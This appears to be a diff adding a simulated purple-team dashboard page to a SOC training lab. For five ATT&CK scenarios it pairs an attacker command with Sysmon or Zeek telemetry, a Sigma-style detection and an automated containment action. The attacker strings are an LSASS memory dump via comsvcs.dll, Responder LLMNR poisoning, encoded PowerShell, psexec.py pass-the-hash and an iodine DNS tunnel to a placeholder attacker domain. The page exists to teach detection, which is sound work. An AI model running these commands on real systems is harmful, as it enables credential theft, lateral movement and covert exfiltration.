@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Purple Team Correlation & SOAR Visualizer — SOC Lab</title>
+  <link rel="stylesheet" href="soc-theme.css">
+  <style>
+    .purple-scenario-btn {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      color: var(--text-secondary);
+      padding: 8px 14px;
+      border-radius: var(--radius-sm);
+      font-size: 12px;
+      cursor: pointer;
+      font-weight: 500;
+      transition: all 0.15s ease;
+    }
+    .purple-scenario-btn.active, .purple-scenario-btn:hover {
+      background: var(--accent);
+      color: #fff;
+      border-color: var(--accent);
+    }
+    .purple-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: var(--space-4);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      position: relative;
+      transition: all 0.25s ease;
+    }
+    .purple-card.highlight {
+      border-color: var(--accent);
+      box-shadow: 0 0 20px rgba(59,130,246,0.3);
+      transform: translateY(-2px);
+    }
+    .flow-connector {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      color: var(--accent);
+    }
+    /* Flowchart nodes */
+    .flowchart-wrap {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      overflow-x: auto;
+      padding: 16px 8px;
+    }
+    .flow-node {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px 16px;
+      min-width: 170px;
+      font-size: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      position: relative;
+    }
+    .flow-node.completed {
+      border-color: #22c55e;
+      background: rgba(34,197,94,0.08);
+    }
+    .flow-node.running {
+      border-color: #eab308;
+      background: rgba(234,179,8,0.08);
+      animation: pulse-node 1.5s infinite;
+    }
+    @keyframes pulse-node {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+    }
+    .flow-arrow {
+      color: #60a5fa;
+      font-size: 16px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+<div class="layout">
+
+  <nav class="sidebar">
+    <div class="sidebar-brand">
+      <a href="index.html" class="brand-icon" style="text-decoration:none;font-size:15px;">🛡️</a>
+      <div class="brand-text">
+        <span class="brand-title">SOC Lab v2</span>
+        <span class="brand-sub">COMMAND CENTER</span>
+      </div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Dashboards</div>
+            <ul class="sidebar-nav">
+        <li class="nav-item"><a href="01_soc_overview.html"><span class="nav-icon">📊</span><span>SOC Overview</span></a></li>
+        <li class="nav-item"><a href="02_opensearch_siem.html"><span class="nav-icon">🔍</span><span>OpenSearch SIEM</span></a></li>
+        <li class="nav-item"><a href="03_zeek_network.html"><span class="nav-icon">🌐</span><span>Zeek Network</span></a></li>
+        <li class="nav-item"><a href="04_suricata_ids.html"><span class="nav-icon">🚨</span><span>Suricata IDS</span></a></li>
+        <li class="nav-item"><a href="05_ai_agents.html"><span class="nav-icon">🤖</span><span>AI Agents</span></a></li>
+        <li class="nav-item"><a href="06_iris_cases.html"><span class="nav-icon">📋</span><span>DFIR-IRIS</span></a></li>
+        <li class="nav-item"><a href="07_caldera_attack.html"><span class="nav-icon">⚔️</span><span>Caldera</span></a></li>
+        <li class="nav-item"><a href="08_misp_ti.html"><span class="nav-icon">🌍</span><span>MISP Intel</span></a></li>
+        <li class="nav-item"><a href="09_velociraptor.html"><span class="nav-icon">🦖</span><span>Velociraptor</span></a></li>
+        <li class="nav-item"><a href="10_responder_redteam.html"><span class="nav-icon">🎭</span><span>Responder</span></a></li>
+        <li class="nav-item"><a href="11_detection_engineering.html"><span class="nav-icon">🛠️</span><span>Detection Eng</span></a></li>
+        <li class="nav-item"><a href="12_purple_team.html" class="active"><span class="nav-icon">🎯</span><span>Purple Team</span></a></li>
+        <li class="nav-item"><a href="13_threat_hunting.html"><span class="nav-icon">🔎</span><span>Threat Hunting</span></a></li>
+        <li class="nav-item"><a href="14_cloud_security.html"><span class="nav-icon">☁️</span><span>Cloud SOC</span></a></li>
+        <li class="nav-item"><a href="15_malware_analysis.html"><span class="nav-icon">🧬</span><span>Malware &amp; YARA</span></a></li>
+        <li class="nav-item"><a href="16_d3fend_matrix.html"><span class="nav-icon">🛡️</span><span>MITRE D3FEND</span></a></li>
+        <li class="nav-item"><a href="17_asset_inventory.html"><span class="nav-icon">🖥️</span><span>Asset &amp; EDR Health</span></a></li>
+        <li class="nav-item"><a href="18_threat_intel_feeds.html"><span class="nav-icon">📡</span><span>Threat Feeds Hub</span></a></li>
+        <li class="nav-item"><a href="19_network_topology.html"><span class="nav-icon">🗺️</span><span>Network Topology</span></a></li>
+      </ul>
+    </div>
+    <div class="sidebar-footer">SOC Lab v2.0 · OSS</div>
+  </nav>
+
+  <header class="topbar">
+    <div class="topbar-title"><span class="page-icon">🎯</span> Purple Team Correlation & SOAR Visualizer</div>
+    <span class="topbar-meta"><span class="status-dot up"></span> End-to-End Pipeline Synchronized · MTTD: 1.4s</span>
+    <div class="topbar-right">
+      <button class="btn btn-primary btn-sm" id="sim-btn" onclick="runPurpleSimulation()">▶ Run Synchronized Simulation</button>
+      <a href="index.html" class="btn btn-ghost btn-sm">← Portal</a>
+    </div>
+  </header>
+
+  <main class="main-content">
+
+    <div class="grid-4 mb-4">
+      <div class="kpi-card critical">
+        <div class="kpi-label">Mean Time to Detect (MTTD)</div>
+        <div class="kpi-value" id="mttd-val">1.4s</div>
+        <div class="kpi-sub">ingestion → alert</div>
+      </div>
+      <div class="kpi-card high">
+        <div class="kpi-label">Mean Time to Respond (MTTR)</div>
+        <div class="kpi-value" id="mttr-val">3.8s</div>
+        <div class="kpi-sub">SOAR containment</div>
+      </div>
+      <div class="kpi-card low">
+        <div class="kpi-label">Containment Rate</div>
+        <div class="kpi-value">100%</div>
+        <div class="kpi-sub">automated isolation</div>
+      </div>
+      <div class="kpi-card info">
+        <div class="kpi-label">Scenarios Verified</div>
+        <div class="kpi-value">5 / 5</div>
+        <div class="kpi-sub">ATT&CK aligned</div>
+      </div>
+    </div>
+
+    <!-- Scenario Selector -->
+    <div class="card mb-4">
+      <div class="card-header"><span class="card-title">🎯 Select Attack & Detection Scenario</span></div>
+      <div class="card-body" style="display:flex;gap:10px;flex-wrap:wrap;padding-top:var(--space-3);">
+        <button class="purple-scenario-btn active" id="sc-lsass" onclick="selectScenario('lsass', this)">[T1003.001] LSASS Mimikatz Dump</button>
+        <button class="purple-scenario-btn" id="sc-llmnr" onclick="selectScenario('llmnr', this)">[T1557.001] LLMNR Poisoning (Responder)</button>
+        <button class="purple-scenario-btn" id="sc-ps" onclick="selectScenario('ps', this)">[T1059.001] Obfuscated PowerShell</button>
+        <button class="purple-scenario-btn" id="sc-smb" onclick="selectScenario('smb', this)">[T1021.002] SMB Lateral Movement</button>
+        <button class="purple-scenario-btn" id="sc-c2" onclick="selectScenario('c2', this)">[T1071.004] DNS C2 Tunneling</button>
+      </div>
+    </div>
+
+    <!-- 4-Stage Purple Team Pipeline View -->
+    <div class="grid-4 mb-4">
+      
+      <!-- Stage 1: Red Team Action -->
+      <div class="purple-card" id="card-red">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="color:#ef4444;font-weight:700;font-size:12px;">🔴 1. Red Team Action</span>
+          <span class="badge badge-critical" id="red-status">READY</span>
+        </div>
+        <div style="font-size:11px;color:var(--text-secondary);margin-top:4px;" id="red-desc">
+          Caldera Adversary Ability / Red Team Tool
+        </div>
+        <pre class="log-block" id="red-cmd" style="font-size:10px;color:#fca5a5;max-height:90px;overflow-x:auto;">rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 lsass.dmp full</pre>
+        <div style="font-size:10px;color:var(--text-muted);" id="red-meta">Target: WORKSTATION-12 (10.0.0.100)</div>
+      </div>
+
+      <!-- Stage 2: Telemetry Ingested -->
+      <div class="purple-card" id="card-telem">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="color:#06b6d4;font-weight:700;font-size:12px;">🌐 2. Sensor Telemetry</span>
+          <span class="badge badge-info" id="telem-status">IDLE</span>
+        </div>
+        <div style="font-size:11px;color:var(--text-secondary);margin-top:4px;" id="telem-desc">
+          Sysmon / Zeek / Suricata Event
+        </div>
+        <pre class="log-block" id="telem-log" style="font-size:10px;color:#67e8f9;max-height:90px;overflow-x:auto;">Sysmon EventID 10: ProcessAccess -> TargetImage: C:\Windows\System32\lsass.exe, GrantedAccess: 0x1010</pre>
+        <div style="font-size:10px;color:var(--text-muted);" id="telem-meta">Index: sysmon-* | Ingestion: 24ms</div>
+      </div>
+
+      <!-- Stage 3: Detection Fired -->
+      <div class="purple-card" id="card-det">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="color:#eab308;font-weight:700;font-size:12px;">🔍 3. Detection Rule</span>
+          <span class="badge badge-medium" id="det-status">IDLE</span>
+        </div>
+        <div style="font-size:11px;color:var(--text-secondary);margin-top:4px;" id="det-desc">
+          Sigma Query DSL & ElastAlert2 Rule
+        </div>
+        <pre class="log-block" id="det-rule" style="font-size:10px;color:#fde047;max-height:90px;overflow-x:auto;">SOC-003 | T1003.001 — LSASS Credential Dumping (Sigma match: TargetImage: lsass.exe)</pre>
+        <div style="font-size:10px;color:var(--text-muted);" id="det-meta">Severity: CRITICAL | Alert ID: ALT-9021</div>
+      </div>
+
+      <!-- Stage 4: SOAR Remediation -->
+      <div class="purple-card" id="card-soar">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="color:#22c55e;font-weight:700;font-size:12px;">🛡️ 4. Automated SOAR</span>
+          <span class="badge badge-low" id="soar-status">IDLE</span>
+        </div>
+        <div style="font-size:11px;color:var(--text-secondary);margin-top:4px;" id="soar-desc">
+          StackStorm Action Execution
+        </div>
+        <pre class="log-block" id="soar-action" style="font-size:10px;color:#86efac;max-height:90px;overflow-x:auto;">soc_pack.quarantine_host -> Velociraptor Isolate WORKSTATION-12 + IRIS Ticket #42 Opened</pre>
+        <div style="font-size:10px;color:var(--text-muted);" id="soar-meta">Execution: SUCCESS | Duration: 180ms</div>
+      </div>
+
+    </div>
+
+    <!-- Interactive SOAR Playbook Flowchart Visualizer (Option 4) -->
+    <div class="card mb-4">
+      <div class="card-header" style="justify-content:space-between;flex-wrap:wrap;gap:8px;">
+        <span class="card-title">⚡ Interactive SOAR Playbook Workflow Diagram</span>
+        <div style="display:flex;gap:8px;">
+          <button class="btn btn-ghost btn-sm" onclick="approveHumanInTheLoop()">✓ Human-in-the-Loop Override</button>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="flowchart-wrap">
+          <div class="flow-node completed" id="fn-1">
+            <span style="font-weight:700;color:var(--accent);">1. Trigger</span>
+            <span style="font-size:10px;color:var(--text-secondary);">ElastAlert2 Alert Ingested</span>
+            <span class="badge badge-low" style="font-size:9px;width:fit-content;">DONE</span>
+          </div>
+          <span class="flow-arrow">➔</span>
+          <div class="flow-node completed" id="fn-2">
+            <span style="font-weight:700;color:var(--accent);">2. Threat Intel</span>
+            <span style="font-size:10px;color:var(--text-secondary);">Query MISP for IP / Hash</span>
+            <span class="badge badge-low" style="font-size:9px;width:fit-content;">MATCHED</span>
+          </div>
+          <span class="flow-arrow">➔</span>
+          <div class="flow-node completed" id="fn-3">
+            <span style="font-weight:700;color:var(--accent);">3. Host Triage</span>
+            <span style="font-size:10px;color:var(--text-secondary);">Velociraptor Artifact Hunt</span>
+            <span class="badge badge-low" style="font-size:9px;width:fit-content;">ARTIFACTS+</span>
+          </div>
+          <span class="flow-arrow">➔</span>
+          <div class="flow-node completed" id="fn-4">
+            <span style="font-weight:700;color:var(--accent);">4. Containment</span>
+            <span style="font-size:10px;color:var(--text-secondary);">Quarantine & Block IP</span>
+            <span class="badge badge-low" style="font-size:9px;width:fit-content;">ISOLATED</span>
+          </div>
+          <span class="flow-arrow">➔</span>
+          <div class="flow-node completed" id="fn-5">
+            <span style="font-weight:700;color:var(--accent);">5. Case Management</span>
+            <span style="font-size:10px;color:var(--text-secondary);">Auto-Create IRIS Case</span>
+            <span class="badge badge-low" style="font-size:9px;width:fit-content;">CASE #42</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script src="soc-copilot.js"></script>
+<script>
+const SCENARIOS = {
+  lsass: {
+    name: "LSASS Mimikatz Memory Access",
+    redCmd: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
+    redMeta: "Target: WORKSTATION-12 (10.0.0.100)",
+    telemLog: "Sysmon EventID 10: ProcessAccess -> TargetImage: C:\\Windows\\System32\\lsass.exe, GrantedAccess: 0x1010",
+    telemMeta: "Index: sysmon-* | Ingestion: 24ms",
+    detRule: "SOC-003 | T1003.001 — LSASS Credential Dumping (Sigma match: TargetImage: lsass.exe)",
+    detMeta: "Severity: CRITICAL | Alert ID: ALT-9021",
+    soarAction: "soc_pack.quarantine_host -> Velociraptor Isolate WORKSTATION-12 + IRIS Ticket #42 Opened",
+    soarMeta: "Execution: SUCCESS | Duration: 180ms",
+    mttd: "1.2s",
+    mttr: "3.4s"
+  },
+  llmnr: {
+    name: "LLMNR Poisoning (Responder)",
+    redCmd: "responder.py -I eth0 -wrf --lm",
+    redMeta: "Attacker: 192.168.1.105 (VLAN 10)",
+    telemLog: "Zeek llmnr.log: UDP broadcast to 224.0.0.252:5355 | Suricata SID 2024897",
+    telemMeta: "Index: zeek-* & suricata-* | Ingestion: 18ms",
+    detRule: "SOC-006 | T1557 — LLMNR/NBT-NS Poisoning Activity (Zeek transport: udp, port: 5355)",
+    detMeta: "Severity: MEDIUM | Alert ID: ALT-9044",
+    soarAction: "soc_pack.block_ip -> Firewall rule 192.168.1.105 DROP + GPO LLMNR Disable Pushed",
+    soarMeta: "Execution: SUCCESS | Duration: 210ms",
+    mttd: "1.6s",
+    mttr: "4.1s"
+  },
+  ps: {
+    name: "Obfuscated PowerShell Execution",
+    redCmd: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+    redMeta: "Target: WORKSTATION-07 (10.0.0.55)",
+    telemLog: "Sysmon EventID 1: ProcessCreation -> Image: powershell.exe, CommandLine: -enc ...",
+    telemMeta: "Index: sysmon-* | Ingestion: 15ms",
+    detRule: "SOC-001 | T1059.001 — Suspicious Encoded PowerShell Execution (Sigma match: -enc)",
+    detMeta: "Severity: HIGH | Alert ID: ALT-8812",
+    soarAction: "soc_pack.velociraptor_hunt -> ScriptBlock dump + Terminate PID 4920",
+    soarMeta: "Execution: SUCCESS | Duration: 140ms",
+    mttd: "0.9s",
+    mttr: "2.8s"
+  },
+  smb: {
+    name: "SMB Lateral Movement (PsExec)",
+    redCmd: "psexec.py administrator@10.0.0.100 -hashes :e3b0c44298fc1c149afbf4c8996fb924",
+    redMeta: "Source: WORKSTATION-07 -> FILESERVER-01",
+    telemLog: "Security EventID 5140: Network Share Object Accessed -> ShareName: \\*\\ADMIN$",
+    telemMeta: "Index: sysmon-* | Ingestion: 32ms",
+    detRule: "SOC-004 | T1021.002 — Lateral Movement via SMB Shares (Sigma match: ADMIN$)",
+    detMeta: "Severity: HIGH | Alert ID: ALT-7619",
+    soarAction: "soc_pack.quarantine_host -> Revoke session token + Isolate lateral target",
+    soarMeta: "Execution: SUCCESS | Duration: 240ms",
+    mttd: "1.5s",
+    mttr: "4.2s"
+  },
+  c2: {
+    name: "DNS C2 Tunneling",
+    redCmd: "iodine -f -P secret123 10.0.0.1 t1.c2.attacker.com",
+    redMeta: "Beacon Target: cdn-update-sync.com",
+    telemLog: "Zeek dns.log: TXT query length > 64 chars -> high entropy payload",
+    telemMeta: "Index: zeek-* | Ingestion: 20ms",
+    detRule: "SOC-005 | T1071.004 — DNS Covert Channel Exfiltration (Sigma query_length > 64)",
+    detMeta: "Severity: MEDIUM | Alert ID: ALT-6520",
+    soarAction: "soc_pack.enrich_ip -> Sinkhole DNS domain + Block C2 IP at perimeter",
+    soarMeta: "Execution: SUCCESS | Duration: 190ms",
+    mttd: "1.8s",
+    mttr: "4.5s"
+  }
+};
+
+let currentScKey = 'lsass';
+
+function selectScenario(key, btn) {
+  currentScKey = key;
+  document.querySelectorAll('.purple-scenario-btn').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+
+  const s = SCENARIOS[key];
+  document.getElementById('red-cmd').textContent = s.redCmd;
+  document.getElementById('red-meta').textContent = s.redMeta;
+  document.getElementById('telem-log').textContent = s.telemLog;
+  document.getElementById('telem-meta').textContent = s.telemMeta;
+  document.getElementById('det-rule').textContent = s.detRule;
+  document.getElementById('det-meta').textContent = s.detMeta;
+  document.getElementById('soar-action').textContent = s.soarAction;
+  document.getElementById('soar-meta').textContent = s.soarMeta;
+  document.getElementById('mttd-val').textContent = s.mttd;
+  document.getElementById('mttr-val').textContent = s.mttr;
+}
+
+function runPurpleSimulation() {
+  const btn = document.getElementById('sim-btn');
+  btn.disabled = true;
+  btn.textContent = '⚡ Running End-to-End Simulation…';
+
+  const cards = [
+    { id: 'card-red', statusId: 'red-status', label: 'EXECUTING', done: 'FIRED' },
+    { id: 'card-telem', statusId: 'telem-status', label: 'INGESTING', done: 'INDEXED' },
+    { id: 'card-det', statusId: 'det-status', label: 'EVALUATING', done: 'ALERTED' },
+    { id: 'card-soar', statusId: 'soar-status', label: 'CONTAINING', done: 'ISOLATED' },
+  ];
+
+  cards.forEach((c, i) => {
+    setTimeout(() => {
+      document.querySelectorAll('.purple-card').forEach(x => x.classList.remove('highlight'));
+      const cardEl = document.getElementById(c.id);
+      cardEl.classList.add('highlight');
+      document.getElementById(c.statusId).textContent = c.label;
+    }, i * 450);
+  });
+
+  setTimeout(() => {
+    cards.forEach(c => {
+      document.getElementById(c.statusId).textContent = c.done;
+    });
+    btn.disabled = false;
+    btn.textContent = '▶ Run Synchronized Simulation';
+    window.showSocToast(`🎯 Purple Team Run Complete: ${SCENARIOS[currentScKey].name} successfully detected & contained.`);
+  }, cards.length * 450 + 200);
+}
+
+function approveHumanInTheLoop() {
+  window.showSocToast('✓ Human Analyst Approved: Host isolation verified and pushed to Velociraptor.');
+}
+
+selectScenario('lsass');
+</script>
+</body>
+</html>
